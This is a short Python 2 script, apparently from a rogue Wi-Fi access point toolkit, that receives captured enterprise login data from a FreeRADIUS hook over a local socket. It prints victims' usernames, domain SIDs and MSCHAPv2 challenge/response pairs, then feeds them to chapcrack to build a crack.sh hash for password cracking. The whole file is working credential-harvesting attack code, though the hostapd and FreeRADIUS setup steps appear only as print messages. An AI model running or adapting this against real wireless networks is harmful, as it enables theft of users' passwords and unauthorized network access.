from argparse import ArgumentParser
from multiprocessing.connection import Listener
import subprocess
import os

def chapcrack(challenge, response):
    print "[+] Generating crack.sh formatted hash..."
    cmd = ["/usr/local/bin/chapcrack", "radius", "-C" ,str(challenge), "-R", str(response)]
    process = subprocess.Popen(cmd, stdout=None, stderr=subprocess.STDOUT)
    process.wait()

def main():

    parser = ArgumentParser()
    parser.add_argument("-p", "--path", dest="path", required=False,
                        help="Path to FreeRADIUS install directory (default='/etc/freeradius/3.0'")

    parser.add_argument("-s", "--ssid", dest="ssid", required=False,
                        help="SSID for access point")

    args = parser.parse_args()

    print "[+] Generating FreeRADIUS config..."
    print "[+] Starting hostapd..."
    print "[+] Starting FreeRADIUS..."

    # Listener for communication from FreeRADIUS ntlm_auth
    address = ('localhost', 6000)
    listener = Listener(address)
    conn = listener.accept()

    while True:
        try:
            msg = conn.recv()

            if msg["domain_sid"]:
                sid = msg["domain_sid"].split('/')[1]
                sid = sid.split('.')[0]
                print "[+] Got Domain SID: " + sid

            if msg["username"]:
                print "[+] Got Username: " + msg["username"]

            if msg["challenge"]:
                print "[+] Got MSCHAPv2 challenge: " + msg["challenge"]

            if msg["response"]:
                print "[+] Got MSCHAPv2 response: " + msg["response"]

            chapcrack(msg["challenge"],msg["response"])

        except (EOFError) as error:
            listener.close()
            break

if __name__ == "__main__":
    main()
